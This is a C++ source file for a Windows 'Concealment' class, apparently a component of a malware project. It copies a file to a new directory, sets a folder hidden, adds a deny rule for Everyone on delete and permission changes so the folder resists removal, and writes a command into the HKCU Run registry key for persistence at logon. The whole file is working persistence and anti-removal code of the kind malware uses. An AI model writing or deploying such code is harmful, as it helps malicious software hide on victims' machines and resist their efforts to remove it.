#include "Concealment.h"

bool Concealment::Replicate(std::wstring fileName, std::wstring newFileName)
{
	std::wstring dir = newFileName.substr(0, newFileName.find_last_of(L"\\"));
	SHCreateDirectory(NULL, dir.c_str());
	return CopyFileW(fileName.c_str(), newFileName.c_str(), FALSE);
}

bool Concealment::HideFolder(std::wstring path)
{
	return SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
}

bool Concealment::RemoveDeletePermission(std::wstring path)
{
	PSECURITY_DESCRIPTOR pSD = NULL;
	PACL pDacl = NULL, pNewDacl = NULL;
	DWORD dwRes = 1;

	if (!GetNamedSecurityInfoW(path.c_str(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pDacl, NULL, &pSD))
	{
		SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
		PSID everyone_sid = NULL;
		AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID,
			0, 0, 0, 0, 0, 0, 0, &everyone_sid);

		EXPLICIT_ACCESSW ea = { 0 };
		ZeroMemory(&ea, sizeof(EXPLICIT_ACCESSW));
		ea.grfAccessPermissions = DELETE | WRITE_DAC | WRITE_OWNER;
		ea.grfAccessMode = DENY_ACCESS;
		ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
		ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
		ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
		ea.Trustee.ptstrName = (LPWSTR)everyone_sid;
		DWORD errNo = SetEntriesInAclW(1, &ea, pDacl, &pNewDacl);
		if (!errNo)
		{
			dwRes = SetNamedSecurityInfoW(&path[0], SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDacl, NULL);
			LocalFree(pNewDacl);
		}
	}
	LocalFree(pSD);
	return !dwRes;
}

bool Concealment::AddToAutorun(std::wstring path, std::wstring name, std::vector<std::wstring> args)
{
	std::wstring cmd = path + L' ';
	for (std::wstring arg : args)
	{
		cmd += arg + L' ';
	}

	HKEY hKey;
	if (!RegCreateKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey))
	{
		return !RegSetValueExW(hKey, name.c_str(), (DWORD)0, REG_SZ, (BYTE *)cmd.c_str(), (cmd.size() + 1) * sizeof(wchar_t));
	}
	return false;
}
